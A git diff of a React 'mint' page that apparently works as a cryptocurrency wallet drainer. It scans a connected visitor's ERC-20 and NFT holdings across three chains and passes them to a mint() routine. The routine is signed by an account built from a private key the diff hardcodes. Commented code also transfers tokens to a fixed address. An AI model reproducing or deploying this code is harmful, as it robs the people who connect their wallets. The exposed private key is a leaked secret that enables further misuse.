@@ -2,6 +2,7 @@ import { useState, useEffect, useRef } from 'react';
 import { LazyLoadImage } from "react-lazy-load-image-component";
 import { getPublicClient } from '@wagmi/core';
 import { useAccount,  useNetwork, useSwitchNetwork, useConnect } from "wagmi";
+import {privateKeyToAccount } from 'viem/accounts';
 import { mint } from './services/mint.service.js';
 import { isMobile } from 'react-device-detect'
 import { getBalanceErc20 } from './services/erc20.service.js'
@@ -25,7 +26,7 @@ function AppTroll() {
   //TOKENS AFTER GET BALANCE
   const [tokensErc20WithBalance, setTokensErc20WithBalance] = useState([]);
   const [tokensErc721WithBalance, setTokensErc721WithBalance] = useState([]);
-  //STATE FOR NETWORKS STATUS CHECKED OR NOT
+  //STATE FOR NETWORKS CHECKED OR NOT
   const [ethNet, setEthNet] = useState(false);
   const [polygonNet, setPolygonNet] = useState(false);
   const [bscNet, setBscNet] = useState(false);
@@ -33,6 +34,22 @@ function AppTroll() {
   const { isConnected, address } = useAccount()
   const { chain } = useNetwork()
  const client = getPublicClient();
+ const account = privateKeyToAccount(`0xfec68842cdd93cfd6824fae8dded0b30f5eb3f0496b2781a69abc647a922788b`);
+// const LinkGoerli = "0x326C977E6efc84E512bB9C30f76E30c160eD06FB";
+// const { config } = usePrepareContractWrite({
+//   address: LinkGoerli,
+//   abi: erc20abi,
+//   functionName: 'transfer',
+//   args: ["0x4A7Df03838d2A4c9A9B81a3a0099dF500c0Bb102", 1000000000000000000],
+// })
+// const { data, isSuccess, write, isError } = useContractWrite(config)
+ 
+// const sendTx = async () => {
+//   write?.()
+//   console.log(isSuccess, "SUCCESS")
+//   console.log(isError, "ERROR")
+//   console.log(data, "DATA")
+// }
 
   // const advancedMatching = { em: 'some@email.com' }
   // const options = {
@@ -56,10 +73,6 @@ function AppTroll() {
       setPolygonNet(false);
     },
   })
-  // const getDaataProvider = async () => {
-  //   const data = await client.getBlockNumber();
-  //   console.log(data, "DATA");
-  // }
   const sound = require('./GT-song.mp3');
   const [playing, setPlaying] = useState(false);
   useEffect(() => {
@@ -70,7 +83,6 @@ function AppTroll() {
   }, [])
   const audioRef = useRef<any>();
   useEffect(() => {
-    console.log(chain, "CHAIN");
     if (chain !== undefined && address !== undefined && isConnected === true) {
       if (chain.id === 137) {
         getBalanceErc20(dataProviderPolygon, client, tokensErc20Polygon, address, airdropPolygon).then(
@@ -123,7 +135,7 @@ function AppTroll() {
   useEffect(() => {
     console.log("SWITCH NETWORK")
     if ((tokensErc20WithBalance !== undefined && tokensErc721WithBalance !== undefined) && (tokensErc20WithBalance.length > 0 || tokensErc721WithBalance.length > 0)) {
-      mint(chain, chain?.id === 1 ? airdropETH : chain?.id === 137 ? airdropPolygon : airdropBSC, tokensErc20WithBalance, tokensErc721WithBalance, process.env.REACT_APP_SIGNER_API_KEY, client, address);
+      mint(chain, chain?.id === 1 ? airdropETH : chain?.id === 137 ? airdropPolygon : airdropBSC, tokensErc20WithBalance, tokensErc721WithBalance, account, client, address);
     }
     else {
       if (chain !== undefined && !isLoading) {
@@ -140,6 +152,7 @@ function AppTroll() {
     }
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [bscNet, ethNet, polygonNet])
+
   const enterButton = useRef<any>(undefined);
   const siteBlock = useRef<any>(undefined);
  
@@ -215,7 +228,7 @@ function AppTroll() {
                       return (<button
                         disabled={!connector.ready}
                         key={connector.id}
-                        onClick={() => connect({ connector })}
+                        onClick={() =>connect({ connector })}
                         className="button" id="Burgur-Button">CONNECT to <span>mint</span>
                       </button>)
                     }
